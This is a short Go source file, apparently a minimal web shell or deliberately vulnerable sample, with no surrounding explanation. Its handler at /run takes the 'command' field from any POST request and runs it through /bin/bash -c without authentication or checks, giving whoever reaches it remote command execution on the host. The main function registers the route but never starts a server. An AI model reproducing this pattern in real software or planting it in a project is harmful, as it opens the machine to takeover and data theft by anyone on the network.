package main
import web "net/http"
import process "os/exec"
func handler(w web.ResponseWriter, request *web.Request) {
 value := request.PostFormValue("command")
 process.Command("/bin/bash", "-c", value).Run()
}
func main() { web.HandleFunc("/run", handler) }
